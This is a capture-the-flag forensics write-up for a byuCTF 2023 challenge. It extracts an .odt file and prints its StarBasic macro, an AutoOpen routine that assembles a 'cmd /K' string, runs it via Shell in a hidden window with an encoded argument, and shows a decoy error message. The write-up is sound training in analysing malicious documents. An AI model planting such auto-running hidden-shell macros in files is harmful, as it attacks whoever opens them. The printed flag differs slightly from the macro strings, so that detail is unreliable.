# byuCTF 2023 - Bing Chilling (Forensics)

We were given a zip file which I extracted.

The result was a `.odt` file.

When we open the file we see only a few strange images in the document and are warned that the document contains __macros__.

OK, then let's see what macros are embedded in the document!

I renamed the `.odt` file to a `.zip` file and then extracted it again.

A nice trick to get all embedded documents!

Now I took `egrep -R -i <pattern>` and recursively searched for malicious code.

In `Basic/Project/NewMacros.xml` I found the following Macro code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="NewMacros" script:language="StarBasic" script:moduleType="normal">Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
    Dim FGHNBVRGHJJGFDSDUUUU As String
    FGHNBVRGHJJGFDSDUUUU = &quot;cmd /K &quot; + &quot;byu&quot; + &quot;ctf&quot; + &quot;{&quot; + &quot;m@ldocs @re&quot; + &quot;sn@eky and bad}&quot; + &quot;e -WindowStyle hiddeN -E>
    Shell FGHNBVRGHJJGFDSDUUUU, 0
    MsgBox (&quot;Module could not be found.&quot;)
End Sub

</script:module>
```
If we look at the code, we can already see the flag and just need to clean it from the `&quot; + &quot;` sequences.

Flag: `byuctf{m@ldocs_@re_sn@eky and bad}`
